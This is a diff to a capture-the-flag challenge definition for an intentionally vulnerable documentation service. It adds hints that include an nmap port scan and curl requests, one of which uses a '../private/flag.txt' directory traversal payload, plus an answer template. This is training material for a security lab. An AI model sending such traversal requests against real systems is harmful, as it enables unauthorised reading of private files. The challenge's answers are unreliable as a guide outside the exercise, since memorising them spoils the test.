@@ -4,7 +4,7 @@ kind: flag-node-generator
 name: 'HTTP: Directory Traversal Docs'
 description: Documentation library with a vulnerable download endpoint that can reach
   private notes.
-hint_template: Exercise the docs download endpoint before moving to {{NEXT_NODE_NAME}}.
+hint_template: Check how the document service confines requested file paths.
 runtime:
   type: docker-compose
   compose_file: docker-compose.yml
@@ -71,10 +71,23 @@ access_instructions:
     instructions: Record the flag recovered via traversal.
 hint_levels:
   low:
-  - Exercise the docs download endpoint before moving to {{NEXT_NODE_NAME}}.
+  - Check how the document service confines requested file paths.
   medium:
-  - 'File/artifact: {{OUTPUT.File(path):basename}}'
+  - 'Service: Directory Traversal in HTTP Docs. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
+  - |-
+    Check the assigned port:
+    ```bash
+    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
+    ```
   high:
-  - Fetch a normal document
-  - Traverse to a private file
-  - 'Record the private note: Record the flag recovered via traversal.'
+  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
+  - |-
+    Fetch a normal document:
+    ```bash
+    curl 'http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/download?file=network-baseline.txt'
+    ```
+  - |-
+    Traverse to a private file:
+    ```bash
+    curl 'http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/download?file=../private/flag.txt'
+    ```
